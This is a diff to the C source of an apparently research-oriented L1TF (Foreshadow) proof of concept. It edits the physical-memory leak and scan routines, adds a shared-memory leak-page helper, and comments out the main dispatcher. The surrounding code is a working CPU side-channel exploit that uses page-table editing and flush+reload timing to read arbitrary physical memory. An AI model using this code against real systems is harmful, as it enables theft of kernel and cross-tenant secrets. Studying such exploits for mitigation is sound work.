@@ -15,6 +15,7 @@
 #include <sys/utsname.h>
 #include <ucontext.h>
 #include <unistd.h>
+#include <err.h>
 
 #pragma GCC diagnostic push
 #pragma GCC diagnostic ignored "-Wunused-function"
@@ -62,7 +63,7 @@ bool l1tf_check_4(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t c
   return time < THRESHOLD;
 }
 
-leak_addr_t l1tf_leak_buffer_create() {
+leak_addr_t l1tf_leak_buffer_create(void) {
   void *leak_ptr =
       mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
   assert(leak_ptr != MAP_FAILED);
@@ -93,14 +94,14 @@ void l1tf_leak_buffer_free(leak_addr_t *leak) {
   assert(!munmap(leak->leak, PAGE_SIZE));
 }
 
-void initialize_pteditor_lib() {
+void initialize_pteditor_lib(void) {
   fprintf(stderr, "Initializing PTEdit...\r");
   assert(!ptedit_init());
   fprintf(stderr, "Initialized PTEdit! Mapping physical memory to user space...\n");
   ptedit_use_implementation(PTEDIT_IMPL_USER);
 }
 
-reload_buffer_t *l1tf_reload_buffer_create() {
+reload_buffer_t *l1tf_reload_buffer_create(void) {
   reload_buffer_t *reload_buffer = mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
                                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
   assert(reload_buffer != MAP_FAILED);
@@ -277,7 +278,7 @@ void do_leak(const uintptr_t phys_addr, const size_t length) {
   leak_addr_t leak = l1tf_leak_buffer_create();
   l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
 
-  fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
+  fprintf(stderr, "Clear the reload buffer at %p\n", (void*)reload_buffer);
   memset(reload_buffer, 0, sizeof(reload_buffer_t));
 
   const size_t results_size = length * sizeof(uint8_t);
@@ -381,7 +382,7 @@ void do_leak_bitwise(const uintptr_t phys_addr, const size_t length) {
   leak_addr_t leak = l1tf_leak_buffer_create();
   l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
 
-  fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
+  fprintf(stderr, "Clear the reload buffer at %p\n", (void*)reload_buffer);
   memset(reload_buffer, 0, sizeof(reload_buffer_t));
 
   const size_t results_size = length * sizeof(uint8_t);
@@ -469,6 +470,33 @@ int main_leak(const int argc, char *argv[argc], void (*leak_func)(uintptr_t, siz
   exit(0);
 }
 
+void *l1tf_spawn_leak_page(void) {
+  int fd = shm_open("/l1tf_leak_page", O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
+  if (fd < 0) {
+    // It already exists, so let's reuse it!
+    if (errno != EEXIST) {
+      err(EXIT_FAILURE, "Failed to open leak shm page");
+    }
+
+    fd = shm_open("/l1tf_leak_page", O_RDWR, S_IRUSR | S_IWUSR);
+    if (fd < 0) {
+      err(EXIT_FAILURE, "Failed to open existing leak shm page");
+    }
+  }
+
+  // Make sure the shared memory region is page in size
+  if (ftruncate(fd, PAGE_SIZE) != 0) {
+    err(EXIT_FAILURE, "Failed to resize shared memory");
+  }
+
+  void *leak_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                         MAP_SHARED | MAP_POPULATE, fd, 0);
+  if (leak_page == (void *)-1) {
+    err(errno, "mmap of leak page failed");
+  }
+  return leak_page;
+}
+
 int main_scan(const int argc, char *argv[argc]) {
   uintptr_t start_addr = -1;
   size_t stride = getpagesize();
@@ -547,25 +575,25 @@ int main_scan(const int argc, char *argv[argc]) {
   return 0;
 }
 
-int main(int argc, char *argv[argc]) {
-  assert(argc > 0);
-
-  if (argc >= 2) {
-    if (!strcmp("leak", argv[1])) {
-      return main_leak(argc, argv, do_leak);
-    } else if (!strcmp("leak_bitwise", argv[1])) {
-      return main_leak(argc, argv, do_leak_bitwise);
-    } else if (!strcmp("scan", argv[1])) {
-      return main_scan(argc, argv);
-    }
-  }
-
-  char *name = argv[0];
-  fprintf(stderr,
-          "Usage\n"
-          "\t%s leak\n"
-          "\t%s leak_bitwise\n"
-          "\t%s scan\n",
-          name, name, name);
-  exit(1);
-}
+// int main(int argc, char *argv[argc]) {
+//   assert(argc > 0);
+//
+//   if (argc >= 2) {
+//     if (!strcmp("leak", argv[1])) {
+//       return main_leak(argc, argv, do_leak);
+//     } else if (!strcmp("leak_bitwise", argv[1])) {
+//       return main_leak(argc, argv, do_leak_bitwise);
+//     } else if (!strcmp("scan", argv[1])) {
+//       return main_scan(argc, argv);
+//     }
+//   }
+//
+//   char *name = argv[0];
+//   fprintf(stderr,
+//           "Usage\n"
+//           "\t%s leak\n"
+//           "\t%s leak_bitwise\n"
+//           "\t%s scan\n",
+//           name, name, name);
+//   exit(1);
+// }
